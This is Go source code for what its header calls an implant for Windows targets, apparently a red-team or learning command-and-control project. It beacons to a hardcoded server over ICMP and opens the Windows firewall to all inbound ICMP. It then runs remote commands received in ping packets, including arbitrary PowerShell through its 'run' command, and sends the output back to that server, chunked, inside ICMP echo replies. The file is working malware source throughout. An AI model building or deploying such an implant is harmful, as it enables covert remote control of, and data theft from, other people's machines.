// This is the code for the full on implant for windows targets

// TODO: Chunk data into queues
// TODO: Create Checkin routine with relevant data
// TODO: Implement secret Message for initial callback
// TODO: Create a UUID check in the message, otherwise all agents run any command sent to any agent

package main

import (
	// Base Libs
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"strings"
	"net"
	"os"
	"os/exec"
	"time"
	"syscall"
	"unsafe"
	"strconv"

	// External Libs
	uuid "github.com/satori/go.uuid"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	wapi "github.com/iamacarpet/go-win64api"
	
	//"github.com/go-ole/go-ole"
	//"github.com/go-ole/go-ole/oleutil"

	
)

var (
	advapi32         = syscall.NewLazyDLL("advapi32.dll")
	modkernel32 = syscall.NewLazyDLL("kernel32.dll")

	procCreateToolhelp32Snap = modkernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = modkernel32.NewProc("Process32FirstW")
	procProcess32Next            = modkernel32.NewProc("Process32NextW")
	procCloseHandle          = modkernel32.NewProc("CloseHandle")

	procGetUserNameW = advapi32.NewProc("GetUserNameW")

	chunk []byte // For SplitData()
	output string // For PingListen()

	outputErr error // For PingListen()
)

const (
	// To be used as an egg later
	//secretMessage = "Activate"
	
	TH32CS_SNAPPROCESS = 0x00000002

	
	serverIP = "192.168.230.134"
)


// Task represents information about a running process
type Task struct {
	Name string
	ID   uint32
}

type PROCESSENTRY32 struct {
	Size              uint32
	Usage             uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	Threads           uint32
	ParentProcessID   uint32
	PriClassBase      int32
	Flags             uint32
	ExeFile           [syscall.MAX_PATH]uint16
}

func createToolhelp32Snapshot(dwFlags, th32ProcessID uint32) (syscall.Handle, error) {
	r1, _, err := syscall.Syscall(procCreateToolhelp32Snap.Addr(), 2, uintptr(dwFlags), uintptr(th32ProcessID), 0)
	if r1 == 0 {
		return 0, err
	}
	return syscall.Handle(r1), nil
}

func process32First(hSnapshot syscall.Handle, pe *PROCESSENTRY32) error {
	r1, _, err := syscall.Syscall(procProcess32First.Addr(), 2, uintptr(hSnapshot), uintptr(unsafe.Pointer(pe)), 0)
	if r1 == 0 {
		return err
	}
	return nil
}

func process32Next(hSnapshot syscall.Handle, pe *PROCESSENTRY32) error {
	r1, _, err := syscall.Syscall(procProcess32Next.Addr(), 2, uintptr(hSnapshot), uintptr(unsafe.Pointer(pe)), 0)
	if r1 == 0 {
		return err
	}
	return nil
}

func closeHandle(hObject syscall.Handle) error {
	r1, _, err := syscall.Syscall(procCloseHandle.Addr(), 1, uintptr(hObject), 0, 0)
	if r1 == 0 {
		return err
	}
	return nil
}

// GetRunningTaskList returns a slice of Task structures representing running processes
func GetRunningTaskList() ([]Task, error) {
	const (
		PROCESS_QUERY_INFORMATION = 0x0400
	)

	snapshot, err := createToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, fmt.Errorf("Error creating process snapshot: %v", err)
	}
	defer closeHandle(snapshot)

	var taskList []Task
	var pe PROCESSENTRY32
	pe.Size = uint32(unsafe.Sizeof(pe))

	err = process32First(snapshot, &pe)
	if err != nil {
		return nil, fmt.Errorf("Error getting first process: %v", err)
	}

	for {
		taskList = append(taskList, Task{
			Name: syscall.UTF16ToString(pe.ExeFile[:]),
			ID:   pe.ProcessID,
		})

		err = process32Next(snapshot, &pe)
		if err != nil {
			break
		}
	}

	return taskList, nil
}

func FormatTaskList(taskList []Task) string {
	result := "Process Name                  Process ID\n"
	result += "----------------------------------------\n"
	for _, task := range taskList {
		result += fmt.Sprintf("%-30s %d\n", task.Name, task.ID)
	}
	return result
}


func getUserName() (string, error) {
	var size uint32
	success, _, err := syscall.Syscall(procGetUserNameW.Addr(), 2, uintptr(0), uintptr(unsafe.Pointer(&size)), 0)
	if success == 0 {
		if err != syscall.ERROR_INSUFFICIENT_BUFFER {
			return "", fmt.Errorf("GetUserNameW failed: %v", err)
		}
	}

	buffer := make([]uint16, size)
	success, _, err = syscall.Syscall(procGetUserNameW.Addr(), 2, uintptr(unsafe.Pointer(&buffer[0])), uintptr(unsafe.Pointer(&size)), 0)
	if success == 0 {
		return "", fmt.Errorf("GetUserNameW failed: %v", err)
	}

	return syscall.UTF16ToString(buffer), nil
}


func NewCallBack() {
	agentUuid := (uuid.NewV4()).String()
	data := EncodeData(agentUuid)
	SendData(data, 3)
	return
}

// SplitData is a function that will just take in a byte array and return it into a multi dimensional array
func SplitData(buf []byte, lim int) [][]byte {
	chunks := make([][]byte, 0, len(buf)/lim+1)
	for len(buf) >= lim {
		chunk, buf = buf[:lim], buf[lim:]
		chunks = append(chunks, chunk)
	}
	if len(buf) > 0 {
		chunks = append(chunks, buf[:len(buf)])
	}
	return chunks
}

// EncodeData is a function that takes in a byte array and Encodes it into a b64 string
func EncodeData(input string) string {
	data := base64.StdEncoding.EncodeToString([]byte(input))
	return data
}

// SendData is a function that handles the sending of ICMP data within the payload header
// it takes in a string (should be b64'd) and a seq number (not really needed but good to include based on RFC).
func SendData(data string, seq int) {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatal(err)
	}

	wm := icmp.Message{
		Type: ipv4.ICMPTypeEchoReply, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: seq,
			Data: []byte(data),
		},
	}

	wb, err := wm.Marshal(nil)
	if err != nil {
		log.Fatal(err)
	}
	if _, err := conn.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(serverIP)}); err != nil {
		log.Fatalf("WriteTo err, %s", err)
	}

}

// PingListen is a function that handles the "server" portion of the implant
// Which will just listen for ICMP traffic, parse it, decode it, and then send it to a new powershell process
// in which it will then execute the command it received, encode it, and send it out
// Added a chunking portion that handles large data outputs
func PingListen(buf []byte, packetData int) {

	src := buf[8:packetData]

	hexToString := hex.EncodeToString(src)

	hexDecode, _ := hex.DecodeString(hexToString)

	base64Text := make([]byte, base64.StdEncoding.DecodedLen(len(hexDecode)))
	decode, _ := base64.StdEncoding.Decode(base64Text, []byte(hexDecode))

	command := base64Text[:decode]
	if string(command) == "whoami" {
		output, outputErr = getUserName()
		if outputErr != nil {
			fmt.Printf("Error: %v\n", outputErr)
		}
	} else if string(command) == "tasklist" {
		taskList, err := GetRunningTaskList()
		if err != nil {
			fmt.Println("Error:", err)
			return
		}

		output = FormatTaskList(taskList)
		
	} else if string(command) == "ls" {
		files, err := os.ReadDir(".")
		if err != nil {
			fmt.Println("Error:", err)
			return
		}

		currentDir, _ := os.Getwd()
		details := fmt.Sprintf("Dir listing for: %s\r\n\r\n", currentDir)
		for _, dir := range files {
			var f os.FileInfo
			f, err = dir.Info()
			if err != nil {
				details += fmt.Sprintf("\nthere was an error getting file info for directory '%s'\n", dir)
			}
			perms := f.Mode().String()
			size := strconv.FormatInt(f.Size(), 10)
			modTime := f.ModTime().String()[0:19]
			name := f.Name()
			details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
		}
		output = details

	
	} else if strings.Contains(string(command), "run") {
		cmdTrim := strings.TrimLeft(string(command), "run")
		execOutput, _ := exec.Command("powershell.exe", "/c", cmdTrim).Output()
		output = string(execOutput)

	} else {
		output = "Unknown Command"
	}

	//output, _ := exec.Command("powershell.exe", "/c", string(command)).Output()

	//data := EncodeData(string(output))
	//SendData(data, 3)


	 if len(output) > 6144 {
		chunked := SplitData([]byte(output), 6144)
		for _, row := range chunked {
			data := EncodeData(string(row))
			SendData(data, 3)
			time.Sleep(2 * time.Second)
		}

	} else {

		data := EncodeData(string(output))
		SendData(data, 3)
	} 

}

func init() {
	NewCallBack()
}

func main() {



	// Enable ICMP Inbound
	r := wapi.FWRule{
		Name:              "Allow ICMP Inbound",
		Description:       "Start answering ICMP requests",
		Grouping:          "",
		Enabled:           true,
		Protocol:          wapi.NET_FW_IP_PROTOCOL_ICMPv4,
		Action:            wapi.NET_FW_ACTION_ALLOW,
		ICMPTypesAndCodes: "*", // https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml#icmp-parameters-types
	}

	ok, err := wapi.FirewallRuleAddAdvanced(r)
	if !ok {
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Printf("FW rule with name %q already exists.\n", r.Name)
		}
	}
	if ok {
		fmt.Println("Rule added!")
	}
	
	// while True loop to listen for ICMP data
	for {

		protocol := "icmp"

		netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
		if err != nil {
			fmt.Printf("[-] Error in Resolve IPAddr: %s\n\n", err)
		}

		conn, err := net.ListenIP("ip4:"+protocol, netaddr)
		if err != nil {
			fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
		}

		buf := make([]byte, 100000)

		packetData, _, err := conn.ReadFrom(buf)
		if err != nil {
			fmt.Printf("[+] Error reading packet data, %s\n\n", err)
		}

		go PingListen(buf, packetData)

	}
}


//func SplitData(data []byte, chunkSize int) [][]byte {
//	i := xslice.SplitToChunks(data, chunkSize)
//	ss := i.([][]byte)
//	return ss
//
//}

/* func enableExistingFirewallRule(ruleName string) error {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	unknown, err := oleutil.CreateObject("HNetCfg.FwPolicy2")
	if err != nil {
		return fmt.Errorf("Failed to create COM object: %v", err)
	}
	defer unknown.Release()

	firewallPolicy, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return fmt.Errorf("Failed to query interface: %v", err)
	}
	defer firewallPolicy.Release()

	rules, err := oleutil.GetProperty(firewallPolicy, "Rules")
	if err != nil {
		return fmt.Errorf("Failed to get Rules property: %v", err)
	}
	defer rules.Clear()

	rulesDispatch := rules.ToIDispatch()

	// Get the existing rule by name
	existingRule, err := oleutil.CallMethod(rulesDispatch, "Item", ruleName)
	if err != nil {
		return fmt.Errorf("Failed to get existing rule: %v", err)
	}
	defer existingRule.Clear()

	existingRuleDispatch := existingRule.ToIDispatch()

	// Enable the existing rule
	enabled, err := oleutil.PutProperty(existingRuleDispatch, "Enabled", true)
	if err != nil {
		return fmt.Errorf("Failed to set Enabled property: %v", err)
	}
	defer enabled.Clear()

	return nil
} */

	/* ruleName := "File and Printer Sharing (Echo Request - ICMPv4-In)"

	if err := enableExistingFirewallRule(ruleName); err != nil {
		fmt.Println("Error:", err)
	} else {
		fmt.Printf("Firewall rule '%s' has been enabled.\n", ruleName)
	} */
